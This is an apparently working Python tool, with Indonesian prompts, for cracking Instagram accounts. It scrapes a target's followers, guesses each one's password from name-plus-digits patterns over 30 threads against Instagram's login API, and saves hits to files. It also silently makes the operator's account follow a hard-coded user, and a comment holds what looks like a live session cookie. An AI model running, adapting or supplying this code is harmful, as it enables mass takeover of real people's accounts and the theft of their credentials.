import requests, hashlib, time, re, os
import uuid as uuid_library
import hmac
import json
import hashlib
import requests
import six.moves.urllib as urllib
from rich.tree import Tree
from rich import print as print_t
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor

session   = requests.Session()
signature = '99e16edcca71d7c1f3fd74d447f6281bd5253a623000a55ed0b60014467a53b1'
headers   = {'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G770F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.131 Mobile Safari/537.36 Instagram 284.0.0.22.85 Android (33/13; 450dpi; 1080x2172; samsung; SM-G770F; r5q; qcom; en_US; 477443709)','x-ig-app-id': '1217981644879628'}

# ARRAY
OK, CP = [], []
attamp, array = 0, []

#cokie = 'ig_did=D5A17EF0-23F7-499E-9D67-C84007961C43;ig_nrcb=1;mid=ZBtExgABAAEj2JdiNVZLheSgiLHy;datr=4EQbZL_3ToN66QYiUiY_sFwf;fbm_124024574287414=base_domain=.instagram.com;dpr=2;shbid="4866\05454599387361\0541714816472:01f7783bda7a7770b1f0071ddb5d66a48a45733c211fd2364ed3a138937f72667fc25cef";shbts="1683280472\05454599387361\0541714816472:01f79208cad243df7523571bd97c0a546429a92c29670a14c1234ac8cb1f5037910e88f2";ds_user_id=54599387361;sessionid=54599387361%3ADIsZ7wm0Vyotyw%3A28%3AAYf3IQEBOgaKYrgReBRiTzPcPs88qMpyITXgYom9Fg;csrftoken=yVgum1M0MsVw62AU9X0z3umHbuqkDARl;rur="VLL\05454599387361\0541714821939:01f7f3f6ce1eb93430311357edcfb5e3ddb9d05d53d7625f0cc0f257c9dbf528152ed88e"'

def folder():
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass

def convert(akun, cokie):
    id = session.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={akun}', headers=headers, cookies=cokie).json()["data"]["user"]
    xz = id["id"]
    return xz

def login():
    try:
         cokiz = {'cookie': open('cokie.txt','r').read()}
    except:
         os.system('clear')
         cokie = {'cookie': input(" [?] masukan cookie: ")}
         akun  = re.findall('ds_user_id=(\d+)',cokie['cookie'])[0]
         try:
              url = requests.get(f"https://i.instagram.com/api/v1/users/{akun}/info/", headers=headers, cookies=cokie).json()['user']['username']
              bot = requests.post('https://i.instagram.com/api/v1/web/friendships/{}/follow/'.format("54599387361"), cookies=cokie,headers=headers).json()
              open('cokie.txt','w').write(cokie['cookie'])
              followers(cokie)
         except Exception as e:exit(e)
    followers(cokiz)

def followers(cokie):
    os.system('clear')
    akun = re.findall('ds_user_id=(\d+)',cokie['cookie'])[0]
    try:
        bapi = requests.get(f"https://i.instagram.com/api/v1/users/{akun}/info/", headers=headers, cookies=cokie).json()['user']['full_name']
    except KeyError:
        os.system('rm cokie.txt')
        login()
    print(f' [+] Hai {bapi}')
    nama = input(' [?] masukan username: ')
    uidz = convert(nama, cokie)
    max_id_followers(uidz,'',cokie)

def max_id_followers(target, max_id,cokie):
    try:
         ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20F66 Instagram 285.0.0.13.63 (iPhone12,1; iOS 16_5; pt_BR; pt; scale=2.00; 828x1792; 478871389) NW/3"
         url = requests.get(f"https://www.instagram.com/api/v1/friendships/{target}/followers/?count=100&max_id={max_id}&search_surface=follow_list_page", headers={'user-agent':ua}, cookies=cokie).json()
         for y in url['users']:
             if y['username'] in array:
                pass
             array.append(y['username']+'<=>'+y['full_name'])
             print('\r [+] Berhasil dump : {} akun instagram'.format(len(array)),end="")
         if 'next_max_id' in url:
             max_id_followers(target, url['next_max_id'],cokie)
    except KeyboardInterrupt:pass
    except Exception as e:
        exit(f'\n [×] Erorr: {e}')
    input('\n [+] Pres Enter\n')
    start()

# MULAI CRACK
def start():
    global prog,des
    prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'))
    des = prog.add_task('', total=len(array))
    with prog:
       with ThreadPoolExecutor(max_workers=30) as bff:
           for user in array:
               username = user.split('<=>')[0]
               fullname = user.split('<=>')[1].lower()
               for y in fullname.split(' '):
                   if len(y) == 2 or len(y) == 3 or len(y) == 4 or len(y) == 5:
                      pz = [y+'123', y+'1234', y+'12345', y +'123456']
                   elif len(fullname) <=5:
                      pz = [y+'123', y+'1234', y+'12345', y +'123456']
                   else:
                      pz = [fullname, y, y+'123', y+'1234', y+'12345', y +'123456']
                   bff.submit(brute, username, pz)
       exit(1)

def info(username):
    ses=requests.Session()
    try:
        link = ses.get(f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}", headers=headers).json()["data"]["user"]
        peng = link["edge_followed_by"]["count"]
        meng = link["edge_follow"]["count"]
    except:
        peng = None
        meng = None
    return peng, meng

def hex_digest(*args):
    y = hashlib.md5()
    y.update(b''.join([arg.encode('utf-8') for arg in args]))
    return y.hexdigest()

def generate_device_id(seed):
    volatile_seed = "12345"
    m = hashlib.md5()
    m.update(seed.encode('utf-8') + volatile_seed.encode('utf-8'))
    return 'android-' + m.hexdigest()[:16]

def generate_uuid():
    return str(uuid_library.uuid4())

def generate_signature(data):
    body = hmac.new(signature.encode('utf-8'), data.encode('utf-8'),hashlib.sha256).hexdigest() + '.' + urllib.parse.quote(data)
    sig = 'ig_sig_key_version=4&signed_body={body}'
    return sig.format(body=body)

def brute(username, password):
    global OK, CP, attamp
    while True:
       try:
           csrftoken = session.get('https://i.instagram.com/api/v1/qe/sync/')
           break
       except:pass
    prog.update(des,description=f'Instagram brute: {attamp}/{len(array)} OK:{len(OK)} CP:{len(CP)}')
    prog.advance(des)
    for pw in password:
        try:
             phone_id = generate_uuid()
             uuid = generate_uuid()
             device_id = generate_device_id(hex_digest(username, username))
             data = json.dumps({
                'phone_id': phone_id,
                'device_id': device_id,
                'guid': uuid,
                'username': username,
                'password': pw
             })
             payload = generate_signature(data)
             headers = {
                'User-Agent': 'Instagram 7.3.0 (iPhone6,2; iPhone OS 8_4; en_PH; en) AppleWebKit/420+',
                'Accept': '*/*',
                'Proxy-Connection': 'keep-alive',
                'X-IG-Connection-Type': 'WiFi',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en;q=1',
                'Content-Length': '574',
                'Connection': 'keep-alive',
                'X-IG-Capabilities': 'Fw==',
                'Cookie': (';').join([ y + '='+ h for y, h in session.cookies.get_dict().items()]),
                'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
             }
             response = session.post('https://i.instagram.com/api/v1/accounts/login/', data=payload, headers=headers)
#             open('respon.ig','a').write('%s'%(response.text))
             if 'logged_in_user' in response.json():
                 OK.append(username)
                 cokie = (';').join([ y + '='+ h for y, h in session.cookies.get_dict().items()])
                 followers, following = info(username)
                 khamdihi = Tree('',style='bold green')
                 khamdihi.add('{}|{}'.format(username, pw))
                 khamdihi.add('{}|{}'.format(followers, following))
                 khamdihi.add(cokie)
                 print_t(khamdihi)
                 with open('OK/OK.txt','a', encoding='utf-8') as bff:
                    bff.write('%s|%s|%s|%s\n'%(username, pw, followers, following))
                 break
             elif 'challenge' in response.json():
                 CP.append(username)
                 followers, following = info(username)
                 khamdihi = Tree('',style='bold yellow')
                 khamdihi.add('{}|{}'.format(username, pw))
                 khamdihi.add('{}|{}'.format(followers, following))
                 khamdihi.add(payload)
                 print_t(khamdihi)
                 with open('CP/CP.txt','a', encoding='utf-8') as bff:
                    bff.write('%s|%s|%s|%s\n'%(username, pw, followers,following))
                 break

        except requests.exceptions.ConnectionError:time.sleep(30)
    attamp +=1

if __name__ == '__main__':
   folder()
   login()
